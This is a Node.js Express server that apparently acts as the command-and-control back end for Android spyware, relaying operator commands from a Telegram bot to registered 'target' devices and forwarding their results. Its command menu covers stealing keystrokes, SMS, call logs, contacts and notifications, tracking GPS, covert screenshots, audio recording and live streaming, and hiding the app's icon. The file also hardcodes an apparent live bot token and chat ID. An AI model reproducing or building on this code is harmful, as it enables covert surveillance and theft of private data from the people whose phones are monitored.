const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
// Format: devices.set(deviceId, { chatId, lastSeen, pendingCommands, deviceInfo })
const devices = new Map();

// Store authorized chat IDs (you can add multiple)
const authorizedChats = new Set([
    '5326373447', // Your chat ID from the logs
    // Add more chat IDs here if needed
]);

// Middleware
app.use(express.json());

// Verify if the request is from an authorized chat
function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

// Webhook endpoint for Telegram
app.post('/webhook', async (req, res) => {
    const update = req.body;
    console.log('📩 Received update:', JSON.stringify(update, null, 2));

    if (update.message) {
        const chatId = update.message.chat.id;
        const text = update.message.text;
        const messageId = update.message.message_id;

        // Check if this chat is authorized
        if (!isAuthorizedChat(chatId)) {
            console.log(`⛔ Unauthorized access attempt from chat: ${chatId}`);
            await sendTelegramMessage(chatId, 
                '⛔ You are not authorized to use this bot. Please contact the administrator.');
            return res.sendStatus(200);
        }

        // Handle commands
        if (text && text.startsWith('/')) {
            await handleCommand(chatId, text, messageId);
        }
    }

    res.sendStatus(200);
});
// Add this helper function to ensure valid JSON responses
function sendJsonResponse(res, data, statusCode = 200) {
    try {
        // Ensure we're sending valid JSON
        const jsonString = JSON.stringify(data);
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(jsonString);
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error', message: e.message });
    }
}

// Endpoint for devices to check pending commands
app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device && device.pendingCommands && device.pendingCommands.length > 0) {
            const commands = [...device.pendingCommands];
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} command(s) to device ${deviceId}`);
            sendJsonResponse(res, { commands });
        } else {
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});


// Endpoint for devices to report command results
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    console.log(`📨 Result from device ${deviceId}:`, { command, result, error });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const message = error 
            ? `❌ *Command Failed*\n\n${command}\n\nError: ${error}`
            : `✅ *Command Executed*\n\n${command}\n\nResult:\n${result}`;
        
        await sendTelegramMessage(chatId, message);
        console.log(`📨 Result sent to Telegram chat ${chatId}`);
    }
    
    res.sendStatus(200);
});

// Endpoint for devices to register
app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
    
    // Validate required fields
    if (!deviceId || !chatId || !deviceInfo) {
        console.log('❌ Missing required fields');
        return res.status(400).json({ 
            status: 'error', 
            message: 'Missing required fields. Need deviceId, chatId, and deviceInfo' 
        });
    }
    
    // Verify the chatId is authorized
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration attempt from chat: ${chatId}`);
        console.log('✅ Authorized chats are:', Array.from(authorizedChats));
        return res.status(403).json({ 
            status: 'unauthorized', 
            message: 'Chat ID not authorized',
            authorizedChats: Array.from(authorizedChats)
        });
    }
    
    // Store device information
    devices.set(deviceId, {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    });
    
    console.log(`✅ Device registered successfully!`);
    console.log(`   - Device ID: ${deviceId}`);
    console.log(`   - Chat ID: ${chatId}`);
    console.log(`   - Device Info:`, deviceInfo);
    console.log(`   - Total devices now: ${devices.size}`);
    
    // Send confirmation to Telegram
    await sendTelegramMessage(chatId, 
        `✅ *Device Connected Successfully!*\n\n` +
        `📱 *Device Details:*\n` +
        `Model: ${deviceInfo.model || 'Unknown'}\n` +
        `Android: ${deviceInfo.android || 'Unknown'}\n` +
        `Battery: ${deviceInfo.battery || 'Unknown'}\n` +
        `ID: ${deviceId.substring(0, 8)}...\n\n` +
        `🎯 *Available Commands:*\n` +
        `/status - Get device status\n` +
        `/screenshot - Take screenshot\n` +
        `/location - Get GPS location\n` +
        `/contacts - Get contacts\n` +
        `/help - Show this menu`);
    
    res.json({ status: 'registered', deviceId: deviceId });
});

// Endpoint to list all registered devices
app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown'
        });
    }
    res.json({ 
        total: devices.size,
        devices: deviceList 
    });
});

// Debug endpoint to check a specific device
app.get('/api/debug/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        res.json({
            deviceId: deviceId,
            chatId: device.chatId,
            deviceInfo: device.deviceInfo,
            lastSeen: new Date(device.lastSeen).toISOString(),
            pendingCommands: device.pendingCommands || [],
            pendingCount: device.pendingCommands?.length || 0
        });
    } else {
        res.json({ 
            error: 'Device not found',
            deviceId: deviceId,
            registeredDevices: Array.from(devices.keys())
        });
    }
});

// Test endpoint
app.post('/api/test/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        console.log(`🔔 Test ping received for device ${deviceId}`);
        device.lastSeen = Date.now();
        res.json({ status: 'ok', deviceFound: true });
    } else {
        console.log(`🔔 Test ping received for unknown device ${deviceId}`);
        res.json({ status: 'ok', deviceFound: false });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        timestamp: Date.now()
    });
});

async function handleCommand(chatId, command, messageId) {
    console.log(`🎯 Handling command ${command} from authorized chat ${chatId}`);
    console.log(`📊 Current devices in memory: ${devices.size}`);
    
    // Log all registered devices for debugging
    if (devices.size > 0) {
        console.log('Registered devices:');
        for (const [id, device] of devices.entries()) {
            console.log(`   - Device ${id} -> Chat ${device.chatId}`);
        }
    } else {
        console.log('⚠️ No devices registered');
    }

    // Find device for this chat
    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (String(d.chatId) === String(chatId)) {
            deviceId = id;
            device = d;
            console.log(`✅ Found matching device: ${id}`);
            break;
        }
    }

    if (!deviceId) {
        console.log(`❌ No device found for chat ${chatId}`);
        await sendTelegramMessage(chatId, 
            '❌ No device registered for this chat.\n\n' +
            'Please make sure the Android app is running on your target device.\n' +
            'Current registered chats: ' + (Array.from(devices.values()).map(d => d.chatId).join(', ') || 'none'));
        return;
    }

    // Update last seen
    device.lastSeen = Date.now();

    // Handle help command (shows all available commands)
    if (command === '/help' || command === '/start') {
        await sendTelegramMessage(chatId, getHelpMessage());
        return;
    }

    // For all other commands, add to device's pending queue
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    // IMPORTANT: Add the command to the queue
    const commandObject = {
        command: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command added to queue for device ${deviceId}:`, commandObject);
    console.log(`📊 Pending commands now: ${device.pendingCommands.length}`);

    // Acknowledge command receipt
    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
}

// Help message with all commands
function getHelpMessage() {
    return `📋 *Complete Command List*

*🔍 Monitoring Commands*
/status - Get full device status
/location - Get current GPS location
/battery - Get battery level only
/storage - Get storage information
/network - Get network info (IP, WiFi, Mobile)

*📸 Media Commands*
/screenshot - Take a screenshot NOW
/record - Start 60s audio recording NOW
/stream_start - Start live streaming
/stream_stop - Stop live streaming

*📱 Data Extraction Commands*
/contacts - Get contact list
/calllogs - Get recent call logs
/sms - Get recent SMS messages
/apps - List installed apps
/keystrokes - Get recent keystrokes
/notifications - Get recent notifications

*⚙️ Service Control Commands*
/start_screenshot - Start screenshot SERVICE (continuous)
/stop_screenshot - Stop screenshot service
/start_recording - Start scheduled recording SERVICE
/stop_recording - Stop recording service
/start_stream - Start streaming service
/stop_stream - Stop streaming service

*🛠️ Utility Commands*
/ping - Test connection
/time - Get device time
/info - Get detailed device info

*📊 Stats Commands*
/logs_count - Get total log count
/logs_recent - Get 10 most recent logs
/stats - Get detailed statistics

*⚠️ Danger Commands*
/clear_logs - Clear all logs
/reboot_app - Restart all services
/hide_icon - Hide launcher icon
/show_icon - Show launcher icon

*📋 Quick Reference*
• Just /record - Quick 60s recording
• Just /screenshot - Quick screenshot
• /start_recording - Enable continuous scheduled recording
• /start_screenshot - Enable continuous screenshot service
• /reboot_app - Restart all services
• /hide_icon - Hide app from launcher
• /show_icon - Show app in launcher

For more help, visit the dashboard at http://127.0.0.1:8080`;
}

// Helper to send Telegram messages
async function sendTelegramMessage(chatId, text) {
    try {
        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown'
        });
        console.log(`📨 Message sent to ${chatId}:`, response.data.ok);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        throw error;
    }
}

// Helper to send photo
async function sendTelegramPhoto(chatId, photoBuffer, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoBuffer, 'screenshot.jpg');
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
        console.log(`📸 Photo sent to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending photo:', error.response?.data || error.message);
        throw error;
    }
}

// Helper to send document
async function sendTelegramDocument(chatId, documentBuffer, filename, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', documentBuffer, filename);
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
        console.log(`📎 Document sent to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        throw error;
    }
}
// Add this endpoint to your server.js
app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`💓 Received keep-alive ping from device ${deviceId}`);
    
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ 
            status: 'alive', 
            timestamp: Date.now(),
            deviceId: deviceId 
        });
    } else {
        console.log(`⚠️ Ping from unknown device: ${deviceId}`);
        res.status(404).json({ 
            status: 'unknown', 
            message: 'Device not registered' 
        });
    }
});


// Start server
app.listen(PORT, () => {
    console.log('🚀 ==================================');
    console.log(`🚀 Webhook server running on port ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('🚀 ==================================');
});
